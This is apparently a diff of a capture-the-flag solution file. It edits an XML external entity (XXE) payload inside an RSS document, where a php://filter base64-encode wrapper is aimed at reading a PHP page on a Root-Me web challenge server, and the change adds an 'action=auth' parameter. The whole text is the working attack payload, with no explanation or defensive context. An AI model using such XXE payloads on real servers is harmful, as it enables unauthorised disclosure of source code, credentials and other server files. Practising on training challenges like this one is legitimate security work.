@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE rss [
-<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php" >
+<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php?action=auth" >
 ]>
 <rss version="2.0">
     <channel>
